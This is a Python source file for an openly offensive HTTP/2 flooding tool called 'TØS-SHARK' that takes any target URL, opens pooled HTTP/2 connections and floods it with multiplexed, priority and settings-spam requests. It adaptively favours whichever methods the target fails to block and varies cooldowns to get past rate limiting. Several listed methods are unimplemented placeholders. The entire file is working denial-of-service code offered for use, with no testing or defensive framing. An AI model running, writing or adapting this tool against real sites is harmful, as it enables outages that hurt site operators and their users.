import time
import random
import threading
import sys
import os
from datetime import datetime
from hyper import HTTP20Connection
from hyper.tls import init_context

class T0S_SHARK_HYPER:
    def __init__(self, target_url):
        self.target_url = target_url
        parsed_url = target_url.replace('https://', '').replace('http://', '')
        if '/' in parsed_url:
            self.hostname, path_part = parsed_url.split('/', 1)
            self.path = '/' + path_part
        else:
            self.hostname = parsed_url
            self.path = '/'
        
        self.running = True
        self.start_time = time.time()
        self.total_requests = 0
        self.requests_this_cycle = 0
        self.cycle_start_time = time.time()
        self.successful_requests = 0
        self.blocked_requests = 0
        
        # Attack methods with weights
        self.attack_pool = {
            'H2-MULTIPLEX': {
                'weight': 1.0,
                'success': 0,
                'blocked': 0,
                'avg_rps': 0,
                'last_used': 0
            },
            'H2-PRIORITY-FLOOD': {
                'weight': 1.0,
                'success': 0,
                'blocked': 0,
                'avg_rps': 0,
                'last_used': 0
            },
            'H2-SETTINGS-SPAM': {
                'weight': 1.0,
                'success': 0,
                'blocked': 0,
                'avg_rps': 0,
                'last_used': 0
            },
            'H2-WINDOW-EXPLOIT': {
                'weight': 1.0,
                'success': 0,
                'blocked': 0,
                'avg_rps': 0,
                'last_used': 0
            },
            'H2-PUSHPROMISE-FLOOD': {
                'weight': 1.0,
                'success': 0,
                'blocked': 0,
                'avg_rps': 0,
                'last_used': 0
            },
            'H2-HEADER-COMPRESSION-ABUSE': {
                'weight': 1.0,
                'success': 0,
                'blocked': 0,
                'avg_rps': 0,
                'last_used': 0
            },
            'H2-STREAM-RESET-SPAM': {
                'weight': 1.0,
                'success': 0,
                'blocked': 0,
                'avg_rps': 0,
                'last_used': 0
            }
        }
        
        # Connection pool
        self.connections = []
        self.max_connections = 15
        self.active_streams = 0
        self.max_streams_per_conn = 100
        
        # Status tracking
        self.status_history = []
        self.last_status_log = time.time()
        self.current_methods = []
        self.method_performance = {}
        
        # Initialize
        self.clear_terminal()
        print("[+] TØS-SHARK with HYPER (Real H2)")
        print(f"[+] Target: {self.hostname}")
        print("[+] Initializing connections...")
        self.initialize_connections()
        
        # Start display thread
        self.display_thread = threading.Thread(target=self.display_stats, daemon=True)
        self.display_thread.start()
        
        # Start status logger
        self.log_thread = threading.Thread(target=self.status_logger, daemon=True)
        self.log_thread.start()
    
    def clear_terminal(self):
        """Clear terminal once at start"""
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def color_text(self, text, color):
        """Add ANSI color codes"""
        colors = {
            'red': '\033[91m',
            'green': '\033[92m',
            'yellow': '\033[93m',
            'blue': '\033[94m',
            'purple': '\033[95m',
            'cyan': '\033[96m',
            'reset': '\033[0m'
        }
        return f"{colors.get(color, '')}{text}{colors['reset']}"
    
    def initialize_connections(self):
        """Initialize HTTP/2 connections with hyper"""
        for i in range(min(8, self.max_connections)):
            try:
                conn = HTTP20Connection(
                    host=self.hostname,
                    port=443,
                    secure=True,
                    enable_push=False,
                    ssl_context=init_context()
                )
                self.connections.append({
                    'conn': conn,
                    'active_streams': 0,
                    'requests': 0,
                    'last_reset': time.time()
                })
                time.sleep(0.1)  # Stagger connections
            except Exception as e:
                print(f"[-] Connection {i+1} failed: {e}")
        
        print(f"[+] {len(self.connections)} H2 connections established")
    
    def get_connection(self):
        """Get a connection with available streams"""
        if not self.connections:
            return None
        
        # Find connection with most available streams
        available = []
        for conn_data in self.connections:
            available_streams = self.max_streams_per_conn - conn_data['active_streams']
            if available_streams > 0:
                available.append((conn_data, available_streams))
        
        if not available:
            return None
        
        # Return connection with most available streams
        available.sort(key=lambda x: x[1], reverse=True)
        return available[0][0]
    
    def attack_h2_multiplex(self, duration=30):
        """H2-MULTIPLEX: Multiple concurrent streams"""
        start_time = time.time()
        requests_sent = 0
        success_count = 0
        blocked_count = 0
        
        print(f"[→] Starting H2-MULTIPLEX (30s)")
        
        while time.time() - start_time < duration and self.running:
            conn_data = self.get_connection()
            if not conn_data:
                time.sleep(0.01)
                continue
            
            # Send multiple streams
            streams_this_batch = min(10, self.max_streams_per_conn - conn_data['active_streams'])
            
            for i in range(streams_this_batch):
                try:
                    conn_data['active_streams'] += 1
                    self.active_streams += 1
                    
                    headers = {
                        ':method': 'GET',
                        ':path': f'{self.path}?multiplex={requests_sent}&ts={int(time.time())}',
                        ':authority': self.hostname,
                        ':scheme': 'https',
                        'user-agent': 'Mozilla/5.0',
                        'accept': '*/*'
                    }
                    
                    stream_id = conn_data['conn'].request(headers)
                    response = conn_data['conn'].get_response(stream_id)
                    
                    status = response.status
                    self.total_requests += 1
                    requests_sent += 1
                    conn_data['requests'] += 1
                    
                    # Track status for logging
                    self.status_history.append({
                        'time': time.time(),
                        'status': status,
                        'method': 'H2-MULTIPLEX'
                    })
                    
                    if status == 200:
                        success_count += 1
                        self.successful_requests += 1
                    else:
                        blocked_count += 1
                        self.blocked_requests += 1
                    
                    conn_data['active_streams'] -= 1
                    self.active_streams -= 1
                    
                except Exception as e:
                    conn_data['active_streams'] -= 1
                    self.active_streams -= 1
                    blocked_count += 1
                    self.blocked_requests += 1
                    self.total_requests += 1
                    requests_sent += 1
            
            time.sleep(0.01)  # Small delay between batches
        
        # Update method stats
        total = success_count + blocked_count
        if total > 0:
            rps = requests_sent / duration
            success_rate = success_count / total
            
            self.attack_pool['H2-MULTIPLEX']['success'] += success_count
            self.attack_pool['H2-MULTIPLEX']['blocked'] += blocked_count
            self.attack_pool['H2-MULTIPLEX']['avg_rps'] = (
                self.attack_pool['H2-MULTIPLEX']['avg_rps'] * 0.7 + rps * 0.3
            )
            self.attack_pool['H2-MULTIPLEX']['weight'] = success_rate
            self.attack_pool['H2-MULTIPLEX']['last_used'] = time.time()
        
        return requests_sent, success_count, blocked_count
    
    def attack_h2_priority_flood(self, duration=25):
        """H2-PRIORITY-FLOOD: Priority stream spam"""
        start_time = time.time()
        requests_sent = 0
        success_count = 0
        blocked_count = 0
        
        print(f"[→] Starting H2-PRIORITY-FLOOD (25s)")
        
        while time.time() - start_time < duration and self.running:
            conn_data = self.get_connection()
            if not conn_data:
                time.sleep(0.01)
                continue
            
            try:
                conn_data['active_streams'] += 1
                self.active_streams += 1
                
                headers = {
                    ':method': 'GET',
                    ':path': f'{self.path}?priority={requests_sent}&weight={random.randint(1,256)}',
                    ':authority': self.hostname,
                    ':scheme': 'https',
                    'user-agent': 'Mozilla/5.0',
                    'accept': '*/*'
                }
                
                stream_id = conn_data['conn'].request(headers)
                response = conn_data['conn'].get_response(stream_id)
                
                status = response.status
                self.total_requests += 1
                requests_sent += 1
                conn_data['requests'] += 1
                
                self.status_history.append({
                    'time': time.time(),
                    'status': status,
                    'method': 'H2-PRIORITY-FLOOD'
                })
                
                if status == 200:
                    success_count += 1
                    self.successful_requests += 1
                else:
                    blocked_count += 1
                    self.blocked_requests += 1
                
                conn_data['active_streams'] -= 1
                self.active_streams -= 1
                
            except Exception:
                if 'conn_data' in locals():
                    conn_data['active_streams'] -= 1
                    self.active_streams -= 1
                blocked_count += 1
                self.blocked_requests += 1
                self.total_requests += 1
                requests_sent += 1
            
            time.sleep(0.02)  # Slightly slower for priority
        
        # Update stats
        total = success_count + blocked_count
        if total > 0:
            rps = requests_sent / duration
            success_rate = success_count / total
            
            self.attack_pool['H2-PRIORITY-FLOOD']['success'] += success_count
            self.attack_pool['H2-PRIORITY-FLOOD']['blocked'] += blocked_count
            self.attack_pool['H2-PRIORITY-FLOOD']['avg_rps'] = (
                self.attack_pool['H2-PRIORITY-FLOOD']['avg_rps'] * 0.7 + rps * 0.3
            )
            self.attack_pool['H2-PRIORITY-FLOOD']['weight'] = success_rate
            self.attack_pool['H2-PRIORITY-FLOOD']['last_used'] = time.time()
        
        return requests_sent, success_count, blocked_count
    
    def attack_h2_settings_spam(self, duration=20):
        """H2-SETTINGS-SPAM: Settings frame manipulation"""
        start_time = time.time()
        requests_sent = 0
        success_count = 0
        blocked_count = 0
        
        print(f"[→] Starting H2-SETTINGS-SPAM (20s)")
        
        while time.time() - start_time < duration and self.running:
            conn_data = self.get_connection()
            if not conn_data:
                time.sleep(0.01)
                continue
            
            try:
                # Send settings-like request
                conn_data['active_streams'] += 1
                self.active_streams += 1
                
                headers = {
                    ':method': 'GET',
                    ':path': f'{self.path}?settings={requests_sent}',
                    ':authority': self.hostname,
                    ':scheme': 'https',
                    'user-agent': 'Mozilla/5.0',
                    'accept': '*/*',
                    'x-http2-settings': 'AAEAAQAAAAIAAAABAAMAAABkAAQBAAAA'
                }
                
                stream_id = conn_data['conn'].request(headers)
                response = conn_data['conn'].get_response(stream_id)
                
                status = response.status
                self.total_requests += 1
                requests_sent += 1
                conn_data['requests'] += 1
                
                self.status_history.append({
                    'time': time.time(),
                    'status': status,
                    'method': 'H2-SETTINGS-SPAM'
                })
                
                if status == 200:
                    success_count += 1
                    self.successful_requests += 1
                else:
                    blocked_count += 1
                    self.blocked_requests += 1
                
                conn_data['active_streams'] -= 1
                self.active_streams -= 1
                
            except Exception:
                if 'conn_data' in locals():
                    conn_data['active_streams'] -= 1
                    self.active_streams -= 1
                blocked_count += 1
                self.blocked_requests += 1
                self.total_requests += 1
                requests_sent += 1
            
            time.sleep(0.03)  # Slower for settings spam
        
        # Update stats
        total = success_count + blocked_count
        if total > 0:
            rps = requests_sent / duration
            success_rate = success_count / total
            
            self.attack_pool['H2-SETTINGS-SPAM']['success'] += success_count
            self.attack_pool['H2-SETTINGS-SPAM']['blocked'] += blocked_count
            self.attack_pool['H2-SETTINGS-SPAM']['avg_rps'] = (
                self.attack_pool['H2-SETTINGS-SPAM']['avg_rps'] * 0.7 + rps * 0.3
            )
            self.attack_pool['H2-SETTINGS-SPAM']['weight'] = success_rate
            self.attack_pool['H2-SETTINGS-SPAM']['last_used'] = time.time()
        
        return requests_sent, success_count, blocked_count
    
    def select_methods(self):
        """Select 3-4 methods based on performance"""
        methods = list(self.attack_pool.keys())
        
        # Calculate weights (favor successful methods)
        weights = []
        for method in methods:
            stats = self.attack_pool[method]
            total = stats['success'] + stats['blocked']
            
            if total == 0:
                weight = 1.0  # Default for untested
            else:
                success_rate = stats['success'] / total
                # Boost methods not used recently
                time_since_last = time.time() - stats['last_used']
                recency_boost = min(2.0, 1.0 + (time_since_last / 300))  # Boost after 5 mins
                weight = success_rate * recency_boost
            
            weights.append(weight)
        
        # Normalize weights
        total_weight = sum(weights)
        if total_weight > 0:
            weights = [w/total_weight for w in weights]
        
        # Select 3-4 unique methods
        num_methods = random.randint(3, 4)
        selected = []
        
        for _ in range(num_methods * 2):  # Try twice as many to get unique
            if len(selected) >= num_methods:
                break
            
            method = random.choices(methods, weights=weights, k=1)[0]
            if method not in selected:
                selected.append(method)
                # Reduce weight for this method to encourage variety
                idx = methods.index(method)
                weights[idx] *= 0.3
        
        # Ensure we have enough methods
        while len(selected) < 3:
            extra = random.choice(methods)
            if extra not in selected:
                selected.append(extra)
        
        self.current_methods = selected
        return selected
    
    def status_logger(self):
        """Log status codes every 20 seconds"""
        while self.running:
            time.sleep(20)
            
            if not self.status_history:
                continue
            
            # Get most recent status
            recent_statuses = [s for s in self.status_history 
                             if time.time() - s['time'] < 30]  # Last 30 seconds
            
            if not recent_statuses:
                continue
            
            # Get most common status
            status_counts = {}
            for s in recent_statuses:
                status_counts[s['status']] = status_counts.get(s['status'], 0) + 1
            
            most_common = max(status_counts.items(), key=lambda x: x[1])
            status_code = most_common[0]
            
            # Determine color
            if status_code in [429, 403, 503]:
                color = 'red'
                status_type = 'BLOCKED'
            elif status_code >= 500:
                color = 'yellow'
                status_type = 'ERROR'
            elif status_code >= 400:
                color = 'yellow'
                status_type = 'CLIENT_ERR'
            elif status_code >= 300:
                color = 'blue'
                status_type = 'REDIRECT'
            elif status_code == 200:
                color = 'green'
                status_type = 'OK'
            else:
                color = 'cyan'
                status_type = 'UNKNOWN'
            
            # Create and print log
            log_msg = f"HPS-3M22-{status_type}-{status_code}"
            colored_msg = self.color_text(log_msg, color)
            print(colored_msg)
            
            # Clear old history
            self.status_history = [s for s in self.status_history 
                                 if time.time() - s['time'] < 300]  # Keep 5 minutes
    
    def display_stats(self):
        """Display real-time statistics"""
        while self.running:
            time.sleep(2)
            
            runtime = time.time() - self.start_time
            hours = int(runtime // 3600)
            minutes = int((runtime % 3600) // 60)
            seconds = int(runtime % 60)
            
            # Calculate RPS
            cycle_time = time.time() - self.cycle_start_time
            if cycle_time > 0:
                current_rps = self.requests_this_cycle / cycle_time
            else:
                current_rps = 0
            
            # Calculate success rate
            total = self.successful_requests + self.blocked_requests
            success_rate = (self.successful_requests / total * 100) if total > 0 else 0
            
            os.system('cls' if os.name == 'nt' else 'clear')
            
            print("=" * 60)
            print(self.color_text("TØS-SHARK — SEA MONSTER TRAFFIC", "cyan"))
            print("=" * 60)
            print(f"Target: {self.color_text(self.hostname, 'yellow')}")
            print(f"Runtime: {hours:02d}:{minutes:02d}:{seconds:02d}")
            print(f"Active Methods: {', '.join(self.current_methods) if self.current_methods else 'None'}")
            print("-" * 60)
            print(f"Total Requests: {self.color_text(str(self.total_requests), 'green')}")
            print(f"Current RPS: {self.color_text(f'{current_rps:.1f}', 'green')}")
            print(f"Success Rate: {self.color_text(f'{success_rate:.1f}%', 'green' if success_rate > 70 else 'yellow')}")
            print(f"Active Streams: {self.active_streams}/{self.max_streams_per_conn * len(self.connections)}")
            print(f"Connections: {len(self.connections)}/{self.max_connections}")
            print("-" * 60)
            
            # Show method effectiveness
            print("Method Performance:")
            for method in self.current_methods[:3]:  # Show top 3
                stats = self.attack_pool[method]
                total = stats['success'] + stats['blocked']
                if total > 0:
                    rate = (stats['success'] / total) * 100
                    color = 'green' if rate > 70 else 'yellow' if rate > 30 else 'red'
                    print(f"  {method}: {self.color_text(f'{rate:.1f}%', color)} "
                          f"(RPS: {stats['avg_rps']:.1f})")
            
            print("=" * 60)
    
    def attack_cycle(self):
        """Execute one attack cycle with selected methods"""
        self.cycle_start_time = time.time()
        self.requests_this_cycle = 0
        
        # Select methods for this cycle
        methods = self.select_methods()
        print(f"\n[+] Selected methods: {', '.join(methods)}")
        
        # Execute each method
        for method in methods:
            if not self.running:
                break
            
            if method == 'H2-MULTIPLEX':
                sent, success, blocked = self.attack_h2_multiplex()
                self.requests_this_cycle += sent
            elif method == 'H2-PRIORITY-FLOOD':
                sent, success, blocked = self.attack_h2_priority_flood()
                self.requests_this_cycle += sent
            elif method == 'H2-SETTINGS-SPAM':
                sent, success, blocked = self.attack_h2_settings_spam()
                self.requests_this_cycle += sent
            else:
                # Placeholder for other methods
                print(f"[!] {method} not implemented, skipping")
                time.sleep(5)
                continue
        
        # Dynamic cooldown based on performance
        success_rate = (self.successful_requests / (self.successful_requests + self.blocked_requests)) * 100 \
            if (self.successful_requests + self.blocked_requests) > 0 else 0
        
        if success_rate > 80:
            cooldown = random.uniform(2, 5)  # Short cooldown if doing well
        elif success_rate > 50:
            cooldown = random.uniform(5, 10)  # Medium cooldown
        else:
            cooldown = random.uniform(10, 20)  # Long cooldown if struggling
        
        print(f"[~] Cooldown: {cooldown:.1f}s (Success rate: {success_rate:.1f}%)")
        time.sleep(cooldown)
    
    def start(self):
        """Start the attack"""
        print("[+] TØS-SHARK starting...")
        print("[+] Using HYPER for real HTTP/2 attacks")
        print("[+] Press Ctrl+C to stop\n")
        
        time.sleep(2)
        
        cycle_count = 0
        try:
            while self.running:
                cycle_count += 1
                self.attack_cycle()
                
        except KeyboardInterrupt:
            print("\n[!] Stopping TØS-SHARK...")
            self.running = False
        
        finally:
            # Final stats
            total_time = time.time() - self.start_time
            avg_rps = self.total_requests / total_time if total_time > 0 else 0
            
            print("\n" + "=" * 60)
            print(self.color_text("FINAL STATISTICS", "cyan"))
            print("=" * 60)
            print(f"Total Runtime: {total_time:.1f}s")
            print(f"Total Requests: {self.total_requests}")
            print(f"Average RPS: {avg_rps:.1f}")
            print(f"Success Rate: {(self.successful_requests/(self.successful_requests+self.blocked_requests)*100 if (self.successful_requests+self.blocked_requests)>0 else 0):.1f}%")
            print(f"Attack Cycles: {cycle_count}")
            print("=" * 60)
            
            # Method breakdown
            print("\nMethod Performance Breakdown:")
            for method, stats in self.attack_pool.items():
                total = stats['success'] + stats['blocked']
                if total > 0:
                    rate = (stats['success'] / total) * 100
                    print(f"  {method}: {rate:.1f}% success, "
                          f"Avg RPS: {stats['avg_rps']:.1f}")
            
            print("\n[+] TØS-SHARK stopped.")

def main():
    if len(sys.argv) != 2:
        print("Usage: python t0s_shark_hyper.py https://target.com")
        sys.exit(1)
    
    target_url = sys.argv[1]
    shark = T0S_SHARK_HYPER(target_url)
    shark.start()

if __name__ == "__main__":
    # Check for hyper installation
    try:
        from hyper import HTTP20Connection
    except ImportError:
        print("Error: hyper library not installed!")
        print("Install with: pip install hyper")
        sys.exit(1)
    
    main()
